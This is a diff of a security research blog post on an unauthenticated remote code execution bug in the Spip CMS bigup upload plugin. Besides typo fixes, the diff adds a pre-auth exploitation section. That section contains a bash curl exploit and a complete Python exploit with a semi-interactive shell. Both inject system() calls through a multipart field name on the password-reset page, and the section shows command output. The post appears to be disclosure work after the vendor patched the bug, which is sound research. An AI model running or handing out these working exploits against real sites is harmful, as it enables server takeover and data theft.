@@ -3,13 +3,13 @@ author: "Vozec & Laluka"
 title: "Spip Preauth RCE 2024: Part 2, A Big Upload"
 slug: "spip_preauth_rce_2024_part_2_a_big_upload"
 date: 2024-09-04
-description: "Here's an article describing the discovery of my first CVE in collaboration with @TheLaluka! A PreAuthenticated RCE on Spip CMS version <= 3.4.1 ."
+description: "Another Spip Research article! This time, we'll tell you the story of how Vozec & I got a new unauth RCE on Spip v3.4.1! This all started by a cute challenge of mine, and ended like it always do, in an eval!"
 ---
 
 > Hello dear reader,\
 > This article is the continuation of my Spip research, with a twist!\
 > One Spip Unauth RCE Challenge player ([@Vozec1](https://x.com/Vozec1)) came to me with an extra question after solving my initial challenge: "I think I found another similar bug, are you already aware of this issue?"\
-> And I was not (code changes fast)! We therefore worked together to make the most ouf ot it, here's our co-written story! 💌
+> And I was not (code changes fast)! We therefore worked together to make the most out of it, here's our co-written story! 💌
 
 ## Some Context
 
@@ -212,9 +212,9 @@ public static function extraire_fichiers_valides() {
 }
 ```
 
-> Do you smeel it? That smelly RCE smeel? 👀
+> Do you smel it? That smelly RCE smel? 👀
 
-Indeed, a lot of eval are carried out!
+Indeed, a lot of eval is carried out!
 
 Here's the comments above the function read:
 
@@ -390,7 +390,7 @@ Here we see that the `'` is not filtered, so the context is broken and the call 
 
 Finally, we can add a real payload to control the contents of the string between the square brackets.
 
-The payload payload ``HELLO[AB'.strval(5+5).'CD]`` lead to this log line:
+The payload payload `HELLO[AB'.strval(5+5).'CD]` lead to this log line:
 ```bash
 Undefined array key "AB10CD" in ... plugins-dist/bigup/inc/Bigup/Files.php(276) : eval()'d code on line 1
 ```
@@ -411,7 +411,7 @@ My first reaction was like
 
 But in the end he confirmed that he didn't have it in his notes!
 
-If you're curious, this was related to my [teasing tweet](https://x.com/Vozec1/status/1822647021733281895) from a few weeks ago, hashing the proof that I had this exploit at this time, without leaking sensitive information (kindly suggested to do so by Laluka to keep tracks & proofs).
+If you're curious, this was related to my [teasing tweet](https://x.com/Vozec1/status/1822647021733281895) from a few weeks ago, hashing the proof that I had this exploit at this time, without leaking sensitive information (kindly suggested to do so by Laluka to keep track & proofs).
 
 ```php
 [~/Desktop]$ echo -ne "name=\"RCE['.system('id').die().']\";" | md5sum
@@ -436,3 +436,202 @@ Hello, Laluka here, I'll take the next part that makes this lovely post-auth RCE
 
 ## Making the RCE Pre-Auth
 
+Once Vozec showed me that his issue was related to file upload, and required a form to submit, I had two thoughts:
+
+- First, we might get lucky, maybe the code path is reached with any form?
+- Second, if we're unlucky, we'll have to find another path!
+
+So, here's the flow:
+- `extraire_fichiers_valides()` from `plugins-dist/bigup/inc/Bigup/Files.php`, called by
+  - `gerer_fichiers_postes()` within `plugins-dist/bigup/inc/Bigup.php`, called by
+    - `bigup_formulaire_receptionner($flux)` within `plugins-dist/bigup/bigup_pipelines.php`
+
+I stopped there, as the pipelining system behaves in a "global" way, -close to- every pass through it, so let's "assume" we're lucky, and hit right away!
+
+The code only passes through the right code path if a specific parameter is present, so let's add it! (i.e. `bigup_retrouver_fichiers=foo`)
+
+```bash
+/**
+ * Branchement sur la réception d'un formulaire (avant verifier())
+ *
+ * On remet `$_FILES` avec les fichiers présents pour ce formulaire,
+ * et avant que la fonction verifier native du formulaire soit utilisée,
+ * de sorte qu'elle ait accès à $_FILES rempli.
+ *
+ * @pipeline formulaire_receptionner
+ * @param array $flux
+ * @return array
+ */
+function bigup_formulaire_receptionner($flux) {
+	if (_request('bigup_retrouver_fichiers')) {
+		$bigup = bigup_get_bigup($flux);
+		$bigup->gerer_fichiers_postes(); // les fichiers postés sans JS
+		$liste = $bigup->reinserer_fichiers(_request('bigup_reinjecter_uniquement'));
+		$bigup->surveiller_fichiers($liste);
+	}
+	return $flux;
+}
+```
+
+> Note the `Branchement sur la réception d'un formulaire (avant verifier())` in the comment, clearly stating that all this logic (including eval) will take place before the verification/validation steps take place.. 😅
+
+From there, I took one page that is almost always present, the "forgotten password" one!
+
+- http://0.0.0.0:8000/spip.php?page=spip_pass&lang=fr
+
+What I wanted to have in the request, is the `formulaire_action_args` protected and encoded variable at hand:
+
+ - I want to submit a `form`, therefore requiring `formulaire_action_args`
+ - With extra "files" (our RCE payload)
+ - With our extra `bigup_retrouver_fichiers` param to enable the bigup part!
+
+![formulaire_action_args](formulaire_action_args.png)
+
+Any extra steps? Nope! It worked right away! 🍀
+
+## Unauth Spip RCE Final Exploit
+
+As a script, this gives us the following concise exploit:
+
+```bash
+echo foo > foo.txt
+cmd="id; date"
+formulaire_action_args=$(curl -k 'http://127.0.0.1:8000/spip.php?page=spip_pass&lang=fr' | grep -F formulaire_action_args -C 3 | grep -ioP '[0-9a-zA-Z_/=+]{30,}')
+echo "formulaire_action_args: $formulaire_action_args"
+formulaire_action_args_encoded=$(python3 -c "import sys; from urllib.parse import quote; print(quote(sys.argv[1], safe=str()))" "$formulaire_action_args")
+echo "formulaire_action_args_encoded: $formulaire_action_args_encoded"
+base_url="http://0.0.0.0:8000/spip.php?page=spip_pass&lang=fr&page=spip_pass&lang=fr"
+final_payload="formulaire_action=oubli&formulaire_action_args=$formulaire_action_args_encoded&formulaire_action_sign=&oubli=foo%40foo.foo&nobot=&bigup_retrouver_fichiers=1"
+curl -ki -X POST -F "RCE['.system('$cmd').die().'][][ll]=@foo.txt" "$base_url&$final_payload"
+```
+
+![unauth-spip-rce](unauth-spip-rce.png)
+
+Vozec also made a python script for the same bug:
+
+```þython
+#!/bin/env python3
+import argparse
+import requests
+import re
+import io
+import readline
+from urllib.parse import unquote
+from bs4 import BeautifulSoup
+from requests_toolbelt.multipart.encoder import MultipartEncoder
+import urllib3
+
+urllib3.disable_warnings()
+
+
+class exploit:
+    def __init__(self, args) -> None:
+        self.url = args.target
+        self.s = requests.session()
+
+    def get_tokens(self):
+        headers = {
+            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
+            "Accept": "*/*",
+            "Accept-Language": "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        }
+        url = f"{self.url}/spip.ph%70?pag%65=spip_pass&lang=fr"
+        r = requests.Request(
+            url=url,
+            method="GET",
+            headers=headers,
+        )
+        prep = r.prepare()
+        prep.url = url
+        r = self.s.send(prep, verify=False).text
+        soup = BeautifulSoup(r, "html.parser")
+        token = soup.find("input", {"name": "formulaire_action_args"})["value"]
+        return token
+
+    def exploit(self, cmd):
+        token = self.get_tokens()
+        mp_encoder = MultipartEncoder(
+            fields={
+                "page": "spip_pass",
+                "lang": "fr",
+                "formulaire_action": "oubli",
+                "formulaire_action_args": token,
+                "formulaire_action_sign": "",
+                "oubli": "abc@gmail.com",
+                "nobot": "",
+                "bigup_retrouver_fichiers": "a",
+                f"RCE['.system('{cmd}').die().']": (
+                    "abc.txt",
+                    io.BytesIO(b"Hello"),
+                    "text/plain",
+                ),
+            }
+        )
+        url = f"{self.url}/spip.ph%70?pag%65=spip_pass&lang=fr"
+        r = requests.Request(
+            url=url,
+            method="POST",
+            data=mp_encoder,
+            headers={"Content-Type": mp_encoder.content_type},
+        )
+        prep = r.prepare()
+        prep.url = url
+        r = self.s.send(prep, verify=False)
+        return r.text.strip()
+
+
+def get_args():
+    parser = argparse.ArgumentParser(description="RCE Spip <= 4.3.1")
+    parser.add_argument(
+        "-t", "--target", type=str, required=True, help="Target Url (ex: http://)"
+    )
+    parser.add_argument(
+        "-c", "--cmd", type=str, required=False, help="Shell command to execute"
+    )
+    parser.add_argument(
+        "-s", "--shell", action="store_true", help="Semi interactive shell"
+    )
+    args = parser.parse_args()
+    return args
+
+
+def main():
+    args = get_args()
+    x = exploit(args)
+    if args.cmd:
+        res = x.exploit(args.cmd)
+        print(res)
+
+    if args.shell:
+        while 1:
+            r = x.exploit(input("$ "))
+            print(r)
+
+
+if __name__ == "__main__":
+    main()
+
+"""
+[~/Desktop/autre]$ python3 0day_rce_spip.py -t http://localhost:8000 -c id    
+uid=1000(vozec) gid=1000(vozec) groupes=1000(vozec),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),995(input)
+
+[~/Desktop]$ echo -ne "name=\"RCE['.system('id').die().']\";" | md5sum
+9fd0828be2a9d90e89e226f1fcd6d5d9  -
+"""
+```
+
+## Closing Words
+
+Spip reacted in a timely manner, no timeline this time! Oh yeah, one last thing... 🙃
+
+> Nailed it! 😎
+
+![rce-rootme-acknowledgement](rce-rootme-acknowledgement.png)
+
+---
+
+As always, we hope you've had a nice time reading our adventures! 🧙\
+Feel free to follow both of us for future challenges & cool reads! 💝
+
+![lalu-and-vozec](lalu-and-vozec.png)
